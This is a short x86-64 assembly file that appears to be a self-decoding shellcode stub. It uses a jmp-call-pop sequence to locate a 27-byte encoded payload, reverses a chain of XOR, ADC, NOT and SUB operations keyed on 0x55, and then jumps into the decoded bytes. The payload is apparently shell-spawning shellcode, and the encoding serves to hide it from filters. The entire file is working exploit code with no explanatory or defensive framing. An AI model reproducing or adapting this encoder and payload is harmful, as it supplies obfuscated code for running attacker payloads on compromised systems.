section .text
global _start
_start:
	xor rax, rax

	jmp get_loc
triangulate:
	pop rbx
	push rbx
	pop rdi
	push byte 27	; shellcode_len
	pop rcx
	push byte 0x55
	pop rdx
	
encode_loop:
	mov al, byte [rbx]
	xor al, dl
	adc al, dl
	not al
	sub al, dl
	xor al, dl
	adc al, dl
	not al
	mov byte [rbx], al
	inc rbx
	loop encode_loop
	jmp rdi
	


get_loc:
	call triangulate
	shellcode: db 0x4b,0x7c,0xc3,0x13,0x07,0x05,0x4b,0xce,0x72,0x72,0x6d,0x14,0xb9,0x72,0xa6,0x6b,0x06,0x07,0x62,0x13,0x1a,0x07,0x69,0xf3,0x4e,0xd2,0x30
